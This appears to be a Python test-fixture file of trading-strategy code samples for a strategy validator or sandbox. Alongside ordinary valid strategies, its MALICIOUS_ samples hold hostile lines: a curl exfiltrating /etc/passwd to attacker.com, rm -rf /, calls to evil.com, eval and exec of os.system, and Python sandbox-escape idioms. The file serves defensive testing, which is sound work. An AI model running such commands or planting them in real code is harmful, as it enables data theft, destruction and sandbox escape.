class TestStrategies:
    """
    Collection of strategy code samples for testing.
    """

    VALID_MINIMAL = """
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, TargetWeights, Hold

class MyStrategy(Strategy):
    universe = ["AAPL", "MSFT"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        return TargetWeights({"AAPL": 0.5, "MSFT": 0.5})
"""

    VALID_BUYHOLD = """
from hqg_algorithms import Strategy, Cadence, Slice, PortfolioView, BarSize, Signal, TargetWeights, Hold

class BuyHoldStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data: Slice, portfolio: PortfolioView) -> Signal:
        return TargetWeights({"AAPL": 1.0})
"""

    VALID_SMA = """
import numpy as np
from collections import deque
from hqg_algorithms import Strategy, Cadence, Slice, PortfolioView, BarSize, Signal, TargetWeights, Hold

class SMAStrategy(Strategy):
    universe = ["SPY"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def __init__(self):
        self.short_window = 10
        self.long_window = 30
        self.prices = deque(maxlen=self.long_window)

    def on_data(self, data: Slice, portfolio: PortfolioView) -> Signal:
        price = data.close("SPY")
        if price is None:
            return Hold()

        self.prices.append(price)

        if len(self.prices) < self.long_window:
            return Hold()

        prices_arr = np.array(self.prices)
        short_sma = np.mean(prices_arr[-self.short_window:])
        long_sma = np.mean(prices_arr)

        if short_sma > long_sma:
            return TargetWeights({"SPY": 1.0})
        else:
            return TargetWeights({})
"""

    VALID_MULTIASSET = """
from hqg_algorithms import Strategy, Cadence, Slice, PortfolioView, BarSize, Signal, TargetWeights, Hold

class EqualWeightStrategy(Strategy):
    universe = ["AAPL", "MSFT", "GOOGL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data: Slice, portfolio: PortfolioView) -> Signal:
        symbols = self.universe
        available = [s for s in symbols if data.close(s) is not None]

        if not available:
            return Hold()

        weight = 1.0 / len(available)
        return TargetWeights({sym: weight for sym in available})
"""

    VALID_NUMPY_PANDAS = """
import numpy as np
from collections import deque
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, TargetWeights, Hold

class MomentumStrategy(Strategy):
    universe = ["SPY", "QQQ", "IWM"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def __init__(self):
        self.lookback = 20
        self.history = {}

    def on_data(self, data, portfolio) -> Signal:
        returns = []
        for sym in self.universe:
            price = data.close(sym)
            if price is not None:
                if sym not in self.history:
                    self.history[sym] = deque(maxlen=self.lookback)
                self.history[sym].append(price)

                if len(self.history[sym]) >= self.lookback:
                    arr = np.array(self.history[sym])
                    ret = (arr[-1] / arr[0]) - 1
                    returns.append((sym, ret))

        if not returns:
            return Hold()

        returns.sort(key=lambda x: x[1], reverse=True)
        top = returns[:2]

        weights = {sym: 1.0 / len(top) for sym, _ in top}
        return TargetWeights(weights)
"""

    VALID_MATH = """
import math
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, TargetWeights, Hold

class VolatilityStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        price = data.close("AAPL")
        if price is None:
            return Hold()

        log_price = math.log(price)
        weight = min(1.0, max(0.0, math.tanh(log_price / 10)))
        return TargetWeights({"AAPL": weight})
"""

    VALID_COMPREHENSIONS = """
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, TargetWeights, Hold

class ComprehensionStrategy(Strategy):
    universe = [f"STOCK{i}" for i in range(5)]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        prices = {sym: data.close(sym) for sym in self.universe if data.close(sym)}

        if not prices:
            return Hold()

        total = sum(prices.values())
        weights = {sym: price / total for sym, price in prices.items()}
        filtered = {k: v for k, v in weights.items() if v > 0.1}

        return TargetWeights(filtered) if filtered else Hold()
"""

    MALICIOUS_OS_IMPORT = """
import os
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, TargetWeights

class MaliciousStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        os.system("curl http://attacker.com/exfil?data=$(cat /etc/passwd)")
        return TargetWeights({"AAPL": 1.0})
"""

    MALICIOUS_SUBPROCESS_IMPORT = """
import subprocess
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, TargetWeights

class RCEStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        subprocess.run(["rm", "-rf", "/"])
        return TargetWeights({"AAPL": 1.0})
"""

    MALICIOUS_SOCKET_IMPORT = """
import socket
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, Hold

class BadStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        s = socket.socket()
        s.connect(("evil.com", 80))
        return Hold()
"""

    MALICIOUS_REQUESTS_IMPORT = """
import requests
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, Hold

class BadStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        requests.get("http://evil.com/exfil?data=secret")
        return Hold()
"""

    MALICIOUS_EVAL = """
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, TargetWeights

class EvalStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        user_input = "__import__('os').system('whoami')"
        eval(user_input)
        return TargetWeights({"AAPL": 1.0})
"""

    MALICIOUS_EXEC = """
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, Hold

class BadStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        exec("import os; os.system('whoami')")
        return Hold()
"""

    MALICIOUS_OPEN_FILE = """
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, TargetWeights

class FileReadStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        with open("/etc/passwd", "r") as f:
            secrets = f.read()
        return TargetWeights({"AAPL": 1.0})
"""

    MALICIOUS_COMPILE = """
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, Hold

class BadStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        code = compile("import os", "<string>", "exec")
        return Hold()
"""

    MALICIOUS_DUNDER_IMPORT = """
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, Hold

class BadStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        os = __import__("os")
        os.system("whoami")
        return Hold()
"""

    MALICIOUS_GLOBALS_ACCESS = """
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, TargetWeights

class SandboxEscapeStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        fn = lambda: None
        builtins = fn.__globals__["__builtins__"]
        return TargetWeights({"AAPL": 1.0})
"""

    MALICIOUS_CODE_ACCESS = """
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, Hold

class BadStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        def inner():
            pass
        code_obj = inner.__code__
        return Hold()
"""

    MALICIOUS_CLASS_ESCAPE = """
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, TargetWeights

class TypeConfusionStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        cls = "".__class__.__bases__[0].__subclasses__()
        return TargetWeights({"AAPL": 1.0})
"""

    MALICIOUS_MRO_ACCESS = """
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, Hold

class BadStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        mro = str.__mro__
        return Hold()
"""

    MALICIOUS_BUILTINS_VIA_CLASS = """
from hqg_algorithms import Strategy, Cadence, BarSize, Signal, Hold

class BadStrategy(Strategy):
    universe = ["AAPL"]
    cadence = Cadence(bar_size=BarSize.DAILY)

    def on_data(self, data, portfolio) -> Signal:
        b = (1).__class__.__bases__[0].__subclasses__()
        return Hold()
"""

    MALICIOUS_NO_STRATEGY = """
import numpy as np

def steal_data():
    return {"secret": "data"}

class NotAStrategy:
    def run(self):
        return steal_data()
"""

    MALICIOUS_WRONG_INHERITANCE = """
class MyStrategy:
    def on_data(self, data, portfolio):
        return None
"""

    MALICIOUS_FAKE_STRATEGY_CLASS = """
class Strategy:
    pass

class MyStrategy:
    def on_data(self, data, portfolio):
        return None
"""

    MALICIOUS_SYNTAX_ERROR = """
def broken(
    return None
"""

    MALICIOUS_CODE_TOO_LARGE = "x" * 2_000_000  # 2MB of junk
